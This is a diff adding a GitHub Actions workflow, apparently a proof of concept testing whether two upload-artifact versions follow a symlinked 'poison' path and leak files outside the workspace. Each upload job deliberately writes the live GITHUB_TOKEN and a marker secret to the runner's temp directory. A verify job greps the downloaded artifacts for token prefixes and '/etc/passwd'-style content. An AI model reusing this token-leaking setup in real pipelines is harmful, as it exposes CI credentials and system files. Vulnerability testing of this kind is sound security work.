@@ -1,0 +1,57 @@
+name: artifact-symlink-versions
+on: workflow_dispatch
+permissions:
+  contents: read
+  actions: write
+jobs:
+  upload-v4:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "SECRET_V4_$(openssl rand -hex 8)" > "$RUNNER_TEMP/secret.txt"
+          echo "$GITHUB_TOKEN" > "$RUNNER_TEMP/ghtoken.txt"
+      - uses: actions/checkout@v4
+      - uses: actions/upload-artifact@v4.6.2
+        with:
+          name: out-v4
+          path: poison
+  upload-v7:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "SECRET_V7_$(openssl rand -hex 8)" > "$RUNNER_TEMP/secret.txt"
+          echo "$GITHUB_TOKEN" > "$RUNNER_TEMP/ghtoken.txt"
+      - uses: actions/checkout@v4
+      - uses: actions/upload-artifact@v7.0.1
+        with:
+          name: out-v7
+          path: poison
+  verify:
+    needs: [upload-v4, upload-v7]
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: out-v4
+          path: v4
+      - uses: actions/download-artifact@v7.0.1
+        with:
+          name: out-v7
+          path: v7
+        continue-on-error: true
+      - run: |
+          set -euo pipefail
+          for d in v4 v7; do
+            echo "==== $d ===="
+            find "$d" -type f 2>/dev/null | head -40 || echo missing
+            if grep -R "SECRET_V\|ghu_\|ghs_\|github_pat_\|root:" "$d" 2>/dev/null; then
+              echo "RESULT_$d=EXFIL"
+            else
+              echo "RESULT_$d=CLEAN_OR_MISSING"
+            fi
+            # detect if ghtoken file content looks like a token
+            if find "$d" -name 'ghtoken.txt' -exec head -c 20 {} \; 2>/dev/null | grep -q .; then
+              echo "TOKEN_FILE_$d=PRESENT"
+              find "$d" -name 'ghtoken.txt' -exec wc -c {} \;
+            fi
+          done
